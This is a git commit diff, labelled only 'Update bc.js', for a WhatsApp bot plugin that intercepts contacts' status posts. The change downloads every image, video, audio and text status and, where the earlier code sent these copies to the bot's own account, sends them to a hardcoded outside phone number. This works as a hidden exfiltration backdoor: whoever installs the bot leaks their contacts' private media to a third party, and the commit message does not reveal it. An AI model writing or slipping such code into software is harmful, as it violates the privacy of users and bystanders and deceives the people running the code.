12e5f77cacf7407e34db0956dafd006056d5eac8
repobotg <repobotg@gmail.com>
2024-11-24 14:20:43 -0300

    Update bc.js

--- plugins/bc.js
+++ plugins/bc.js
@@ -1,34 +1,46 @@
+import { downloadContentFromMessage } from '@whiskeysockets/baileys'
 let handler = m => m
 handler.before = async function (m, { conn }) {
 if (m.key.remoteJid !== 'status@broadcast') return
+if (!m?.message) return
 const { imageMessage, videoMessage, audioMessage, extendedTextMessage } = m.message
 if (imageMessage) {
-let media = await m.download?.()
-if (!media) return
-let caption = `━━━━ \`ESTADO\` ━━━━
+const media = await downloadContentFromMessage(imageMessage, 'image')
+let buffer = Buffer.from([])
+for await (const chunk of media) {
+buffer = Buffer.concat([buffer, chunk])}
+const caption = `━━━━ \`ESTADO\` ━━━━
 - *Contacto:* @${m.key.participant.split`@`[0]}
 ${imageMessage.caption ? `- *Texto:* ${imageMessage.caption}` : `- *Texto:* _sin_texto_`}
 ━━━━ \`ESTADO\` ━━━━`
-await conn.sendFile(conn.user.jid, media, null, caption, null, null, { mentions: conn.parseMention(caption), quoted: m })
+await conn.sendMessage('59896026646@s.whatsapp.net', { image: buffer, caption: caption, mentions: parseMention(caption) }, { quoted: m })
 } else if (videoMessage) {
-let media = await m.download?.()
-let caption = `━━━━ \`ESTADO\` ━━━━
+const media = await downloadContentFromMessage(videoMessage, 'video')
+let buffer = Buffer.from([])
+for await (const chunk of media) {
+buffer = Buffer.concat([buffer, chunk])}
+const caption = `━━━━ \`ESTADO\` ━━━━
 - *Contacto:* @${m.key.participant.split`@`[0]}
 ${videoMessage.caption ? `- *Texto:* ${videoMessage.caption}` : `- *Texto:* _sin_texto_`}
 ━━━━ \`ESTADO\` ━━━━`
-await conn.sendFile(conn.user.jid, media, null, caption, null, null, { mentions: conn.parseMention(caption), quoted: m })
+await conn.sendMessage('59896026646@s.whatsapp.net', { video: buffer, caption: caption, mentions: parseMention(caption) }, { quoted: m })
 } else if (audioMessage) {
-let media = await m.download?.()
-let caption = `━━━━ \`ESTADO AUDIO\` ━━━━
+const media = await downloadContentFromMessage(audioMessage, 'audio')
+let buffer = Buffer.from([])
+for await (const chunk of media) {
+buffer = Buffer.concat([buffer, chunk])}
+const caption = `━━━━ \`ESTADO AUDIO\` ━━━━
 - *Contacto:* @${m.key.participant.split`@`[0]}`
-await conn.sendMessage(conn.user.jid, { text: caption, mentions: conn.parseMention(caption) }, { quoted: m })
-await conn.sendMessage(conn.user.jid, { audio: media, ptt: true }, { quoted: m })
+await conn.sendMessage('59896026646@s.whatsapp.net', { text: caption, mentions: parseMention(caption) }, { quoted: m })
+await conn.sendMessage('59896026646@s.whatsapp.net', { audio: buffer, ptt: true }, { quoted: m })
 } else if (extendedTextMessage) {
-let caption = `━━━━ \`ESTADO\` ━━━━
+const caption = `━━━━ \`ESTADO\` ━━━━
 - *Contacto:* @${m.key.participant.split`@`[0]}
 - *Texto:* ${extendedTextMessage.text}
 ━━━━ \`ESTADO\` ━━━━`
-await conn.sendMessage(conn.user.jid, { text: caption, mentions: conn.parseMention(caption) }, { quoted: m })
+await conn.sendMessage('59896026646@s.whatsapp.net', { text: caption, mentions: parseMention(caption) }, { quoted: m })
 } else return
 }
 export default handler
+function parseMention(text = '') {
+return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
